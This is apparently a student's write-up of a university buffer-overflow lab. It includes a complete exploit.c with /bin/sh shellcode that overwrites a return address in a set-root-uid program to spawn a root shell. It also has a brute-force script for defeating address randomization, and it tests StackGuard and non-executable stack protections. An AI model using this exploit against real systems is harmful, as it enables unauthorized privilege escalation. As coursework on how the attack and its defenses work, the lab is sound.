## Lab3  Buffer Overflow Vulnerability Lab

### 1. Lab Overview

​		The learning objective of this lab is for students to gain the first-hand experience on buffer-overflow vulnerability by putting what they have learned about the vulnerability from class into action. Buffer overflow is defined as the condition in which a program attempts to write data beyond the boundaries of pre-allocated fixed length buffers. This vulnerability can be utilized by a malicious user to alter the flow control of the program, even execute arbitrary pieces of code. This vulnerability arises due to the mixing of the storage for data (e.g. buffers) and the storage for controls (e.g. return addresses): an overflow in the data part can
affect the control flow of the program, because an overflow can change the return address.
​		In this lab, students will be given a program with a buffer-overflow vulnerability; their task is to develop a scheme to exploit the vulnerability and finally gain the root privilege. In addition to the attacks, students will be guided to walk through several protection schemes that have been implemented in the operating system to counter against the buffer-overflow attacks. Students need to evaluate whether the schemes work or not and explain why.  



### 2. Lab Task

#### 2.1 Initial Setup

Ubuntu and other Linux distributions have implemented several security mechanisms to make the buffer-overflow attack difficult. To simply our attacks, we need to disable them first.  

* **Address Space Randomization.**   

  ​		Ubuntu and several other Linux-based systems uses address space randomization to randomize the starting address of heap and stack. This makes guessing the exact addresses difficult; guessing addresses is one of the critical steps of buffer-overflow attacks.  

  ​		In this lab, we have to disable these features as following fig.

  <img src="F:\Study_Sources\2022spring\信息安全导论\Lab\Lab3\images\Snipaste_2022-04-14_23-13-00.jpg" style="zoom:80%;" />

* **The StackGuard Protection Scheme.**  

  ​		The GCC compiler implements a security mechanism called ”StackGuard” to prevent buffer overflows. In the presence of this protection, buffer overflow will not work. You can disable this protection if you compile the program using the **-fno-stack-protector** switch. For example, to compile a program example.c with Stack Guard disabled, you may use the following command:  

  ```shell
  $ gcc -fno-stack-protector example.c
  ```

* **Non-Executable Stack.**   

  ​		Ubuntu used to allow executable stacks, but this has now changed: the binary images of programs (and shared libraries) must declare whether they require executable stacks or not, i.e., they need to mark a field in the program header. Kernel or dynamic linker uses this marking to decide whether to make the stack of this running program executable or non-executable. This marking is done automatically by the recent versions of gcc, and by default, the stack is set to be non-executable. To change that, use the following option when compiling programs:  

  ```shell
  For executable stack:
  $ gcc -z execstack -o test test.c
  For non-executable stack:
  $ gcc -z noexecstack -o test test.c
  ```

#### 2.2 Shellcode

​		Before you start the attack, you need a shellcode. A shellcode is the code to launch a shell. It has to be loaded into the memory so that we can force the vulnerable program to jump to it.   

​		Compile and run the following code, and see whether a shell is invoked.  

<img src="F:\Study_Sources\2022spring\信息安全导论\Lab\Lab3\images\Snipaste_2022-04-14_23-41-39.jpg" style="zoom:80%;" />

#### 2.3 The Vulnerable Program  

​		Compile `stack.c` and make it **set-root-uid**. You can achieve this by compiling it in the root account, and chmod the executable to 4755 (don’t forget to include the execstack and -fno-stack-protector options to turn off the non-executable stack and StackGuard protections):  

```shell
$ su root
Password (enter root password)
# gcc -o stack -z execstack -fno-stack-protector stack.c
# chmod 4755 stack
# exit
```

<img src="F:\Study_Sources\2022spring\信息安全导论\Lab\Lab3\images\Snipaste_2022-04-15_12-12-46.jpg" style="zoom:80%;" />

​		The above program has a buffer overflow vulnerability. It first reads an input from a file called “badfile”, and then passes this input to another buffer in the function bof(). The original input can have a maximum length of 517 bytes, but the buffer in bof() has only 12 bytes long. Because strcpy() does not check boundaries, buffer overflow will occur. Since this program is a set-root-uid program, if a normal user can exploit this buffer overflow vulnerability, the normal user might be able to get a root shell. It should be noted that the program gets its input from a file called “badfile”. This file is under users’ control. Now, our objective is to create the contents for “badfile”, such that when the vulnerable program copies the contents into its buffer, a root shell can be spawned.  

#### 2.4 Task1: Exploiting the Vulnerability  

​		We provide you with a partially completed exploit code called “exploit.c”. The goal of this code is **to construct contents for “badfile”**. In this code, the shellcode is given to you. You need to develop the rest.  

​		In order to complete this program, we need to find the address of the buffer using gdb.The debugger stack disassembles the main function. It can be seen that the calling address of `bof` function is **0x08048529,** return address is **0x0804852e**, so next we need to find the address at the end of the program in `bof` function.

<img src="F:\Study_Sources\2022spring\信息安全导论\Lab\Lab3\images\Snipaste_2022-04-15_18-43-07.jpg" style="zoom:80%;" />

​		Disassemble `bof` function

<img src="F:\Study_Sources\2022spring\信息安全导论\Lab\Lab3\images\Snipaste_2022-04-15_18-46-25.jpg" style="zoom:80%;" />

​		It can be seen that the `bof` function ends at the address 0x080484d3. We should change the content of the address here to the address of our shellcode to make the program jump directly to the malicious code we edited at the end.

​		Now that we know that the `bof` function ends at address 0x080484d3, we can set a breakpoint there and check the contents of the stack at this time.

<img src="F:\Study_Sources\2022spring\信息安全导论\Lab\Lab3\images\Snipaste_2022-04-15_18-55-01.jpg" style="zoom:80%;" />

​		As can be seen from the figure, the return address is **36 bytes** different from the AAAA we wrote in badfile, which means that in badfile, as long as we add 36 arbitrary characters before the shellcode address, we can change the original return address into a malicious code address and guide the program to jump.

​		At this time, we already know the storage location and rewriting method of the return address. Next, we need to know the first address of the buffer.

<img src="F:\Study_Sources\2022spring\信息安全导论\Lab\Lab3\images\Snipaste_2022-04-15_19-09-16.jpg" style="zoom:80%;" />

​		We choose to store our shellcode **300** bytes away from `buffer[0]` in order to set aside enough NOP as a buffer for deviation. Then, the address of shellcode is regarded as `buffer[128]`, which is **0xbfffed98 + 0x80**

​		The complete code `exploit.c` is as follows:

```c
/* exploit.c  */

/* A program that creates a file containing code for launching shell*/
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
char shellcode[]=
    "\x31\xc0"             /* xorl    %eax,%eax              */
    "\x50"                 /* pushl   %eax                   */
    "\x68""//sh"           /* pushl   $0x68732f2f            */
    "\x68""/bin"           /* pushl   $0x6e69622f            */
    "\x89\xe3"             /* movl    %esp,%ebx              */
    "\x50"                 /* pushl   %eax                   */
    "\x53"                 /* pushl   %ebx                   */
    "\x89\xe1"             /* movl    %esp,%ecx              */
    "\x99"                 /* cdq                            */
    "\xb0\x0b"             /* movb    $0x0b,%al              */
    "\xcd\x80"             /* int     $0x80                  */
;

void main(int argc, char **argv)
{
    char buffer[517];
    FILE *badfile;

    /* Initialize buffer with 0x90 (NOP instruction) */
    memset(&buffer, 0x90, 517);

    /* You need to fill the buffer with appropriate contents here */ 
	*((long *)(buffer + 36)) = 0xbfffed98 + 0x80;
	memcpy(buffer+300, shellcode, sizeof(shellcode));
    /* Save the contents to the file "badfile" */
    badfile = fopen("./badfile", "w");
    fwrite(buffer, 517, 1, badfile);
    fclose(badfile);
}
```

​		Compile `exploit.c` and run this program to generate badfile. Then run `stack` to verify the program

<img src="F:\Study_Sources\2022spring\信息安全导论\Lab\Lab3\images\Snipaste_2022-04-15_18-23-26.jpg" style="zoom:80%;" />

#### 2.5 Task 2: Address Randomization  

​		Now, we turn on the Ubuntu’s address randomization. We run the same attack developed in Task 1.  

<img src="F:\Study_Sources\2022spring\信息安全导论\Lab\Lab3\images\Snipaste_2022-04-15_21-44-17.jpg" style="zoom:80%;" />

​		It can be found that running the program at this time does not evoke the shell. Multiple attempts to run the program using the script as following.

```sh
#!/bin/bash
SECONDS=0
value=0
while [ 1 ]
	do
	value=$(( $value + 1 ))
	duration=$SECONDS
	min=$(($duration / 60))
	sec=$(($duration % 60))
	echo "$min minutes and $sec seconds taken."
	echo "The program has been running $value times so far."
	./stack
done
```

<img src="F:\Study_Sources\2022spring\信息安全导论\Lab\Lab3\images\Snipaste_2022-04-15_22-18-50.jpg" style="zoom:80%;" />

​		It can be found that after opening the address randomization, the attack program needs a lot of attempts to attack successfully. That is because Address randomization makes the memory address of the processes running on the system unpredictable, making the vulnerabilities related to these processes more difficult to exploit.

#### 2.6 Task 3: Stack Guard  

​		Before working on this task, remember to turn off the address randomization first.

<img src="F:\Study_Sources\2022spring\信息安全导论\Lab\Lab3\images\Snipaste_2022-04-15_22-19-47.jpg" style="zoom:80%;" />

​		Compiling, and changing the ownership + mode of the file `stack.c `

<img src="F:\Study_Sources\2022spring\信息安全导论\Lab\Lab3\images\Snipaste_2022-04-15_22-21-20.jpg" style="zoom:80%;" />

​		Compiling and executing the exploit.c file. Error is visible saying “stack is terminated”. Because StackGuard places a random integer value before return address and while overwriting the random value gets overwritten. 

<img src="F:\Study_Sources\2022spring\信息安全导论\Lab\Lab3\images\Snipaste_2022-04-15_22-22-23.jpg" style="zoom:80%;" />

#### 2.7 Task 4: Non-executable Stack

​		Compiling `stack.c `file with the non-executable stack protection. Also changing the ownership and mode of the stack. 

<img src="F:\Study_Sources\2022spring\信息安全导论\Lab\Lab3\images\Snipaste_2022-04-15_22-24-41.jpg" style="zoom:80%;" />

​		Compiling and executing the exploit.c and also executing the stack.c file 

<img src="F:\Study_Sources\2022spring\信息安全导论\Lab\Lab3\images\Snipaste_2022-04-15_22-25-42.jpg" style="zoom:80%;" />

​		“Segmentation fault” appears because the non-executable stack do not let anything on the stack to be executed. 

